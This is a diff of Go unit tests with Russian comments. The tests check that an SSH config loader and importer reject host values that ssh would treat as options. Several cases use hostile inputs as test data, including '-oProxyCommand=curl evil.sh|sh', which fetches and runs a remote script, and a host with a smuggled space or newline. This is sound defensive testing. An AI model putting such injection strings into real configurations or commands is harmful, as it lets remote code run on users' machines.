@@ -233,3 +233,121 @@ func TestWriteWithServersOmitsZeroPortAndLoadDefaultsToSSH(t *testing.T) {
 		t.Fatalf("Port=%d, want 22", got)
 	}
 }
+
+// TestLoadRejectsHostParsedAsOption — Дано: конфиг с адресом, начинающимся с
+// «-»; Когда: конфиг читается; Тогда: отказ с внятной причиной, а не молчаливо
+// принятое значение, которое ssh разберёт как опцию.
+func TestLoadRejectsHostParsedAsOption(t *testing.T) {
+	for _, tc := range []struct{ name, body, want string }{
+		{
+			name: "leading dash",
+			body: "servers:\n  - name: evil\n    host: \"-oProxyCommand=curl evil.sh|sh\"\n",
+			want: "начинается",
+		},
+		{
+			name: "space inside",
+			body: "servers:\n  - name: spaced\n    host: \"10.0.0.1 -oProxyCommand=id\"\n",
+			want: "пробел",
+		},
+		{
+			name: "empty host",
+			body: "servers:\n  - name: nowhere\n    user: root\n",
+			want: "пустой",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			path := filepath.Join(t.TempDir(), "config.yaml")
+			if err := os.WriteFile(path, []byte(tc.body), 0o600); err != nil {
+				t.Fatal(err)
+			}
+
+			_, err := Load(path)
+
+			if !errors.Is(err, ErrBadHost) {
+				t.Fatalf("Load принял негодный host: %v", err)
+			}
+			if !strings.Contains(err.Error(), tc.want) {
+				t.Fatalf("ошибка не объясняет причину (%q): %v", tc.want, err)
+			}
+		})
+	}
+	// И: обычный адрес по-прежнему читается.
+	path := filepath.Join(t.TempDir(), "config.yaml")
+	if err := os.WriteFile(path, []byte("servers:\n  - host: 10.0.0.1\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := Load(path); err != nil {
+		t.Fatalf("Load обычного конфига: %v", err)
+	}
+}
+
+// TestImportRejectsHostParsedAsOption — Дано: выбранный при импорте хост с
+// адресом-опцией; Когда: серверы пишутся в конфиг; Тогда: запись отклонена —
+// такой адрес не должен доехать до argv команды `ssh`.
+func TestImportRejectsHostParsedAsOption(t *testing.T) {
+	hostile := []Server{{Name: "evil", Host: "-oProxyCommand=curl evil.sh|sh", User: "root"}}
+
+	dir := t.TempDir()
+	fresh := filepath.Join(dir, "fresh.yaml")
+	if err := WriteWithServers(fresh, hostile); !errors.Is(err, ErrBadHost) {
+		t.Fatalf("WriteWithServers: %v", err)
+	}
+	if _, err := os.Stat(fresh); err == nil {
+		t.Fatal("конфиг с негодным хостом всё-таки создан")
+	}
+
+	empty := filepath.Join(dir, "empty.yaml")
+	if err := os.WriteFile(empty, []byte("servers:\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if err := PopulateServers(empty, hostile); !errors.Is(err, ErrBadHost) {
+		t.Fatalf("PopulateServers: %v", err)
+	}
+
+	existing := filepath.Join(dir, "existing.yaml")
+	if err := os.WriteFile(existing, []byte("servers:\n  - name: web\n    host: 10.0.0.1\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := AddServers(existing, hostile); !errors.Is(err, ErrBadHost) {
+		t.Fatalf("AddServers: %v", err)
+	}
+	if body, err := os.ReadFile(existing); err != nil || strings.Contains(string(body), "ProxyCommand") {
+		t.Fatalf("негодный хост попал в конфиг: %v %s", err, body)
+	}
+}
+
+// TestCheckHostRejectsArgumentLikeValues — Дано: значения host, которые ssh
+// разберёт не как адрес; Когда: конфиг проверяется; Тогда: причина названа
+// вместе с именем сервера.
+func TestCheckHostRejectsArgumentLikeValues(t *testing.T) {
+	for _, tc := range []struct {
+		name   string
+		server Server
+		want   string
+	}{
+		{name: "proxy command", server: Server{Name: "evil", Host: "-oProxyCommand=curl evil.sh|sh"}, want: "начинается"},
+		{name: "single dash", server: Server{Name: "dash", Host: "-"}, want: "начинается"},
+		{name: "space", server: Server{Name: "spaced", Host: "10.0.0.1 -oProxyCommand=id"}, want: "пробел"},
+		{name: "newline", server: Server{Name: "multiline", Host: "10.0.0.1\nhost 10.0.0.2"}, want: "перевод строки"},
+		{name: "empty", server: Server{Name: "nowhere"}, want: "пустой"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			err := checkHost(tc.server)
+
+			if !errors.Is(err, ErrBadHost) {
+				t.Fatalf("host %q принят: %v", tc.server.Host, err)
+			}
+			for _, want := range []string{tc.server.Name, tc.want} {
+				if !strings.Contains(err.Error(), want) {
+					t.Fatalf("ошибка без %q: %v", want, err)
+				}
+			}
+		})
+	}
+	// И: обычные адреса и алиасы из ~/.ssh/config проходят.
+	for _, host := range []string{"10.0.0.1", "example.com", "vm-prod-emarb", "2001:db8::1"} {
+		if err := checkHost(Server{Name: "ok", Host: host}); err != nil {
+			t.Fatalf("host %q отвергнут: %v", host, err)
+		}
+	}
+}
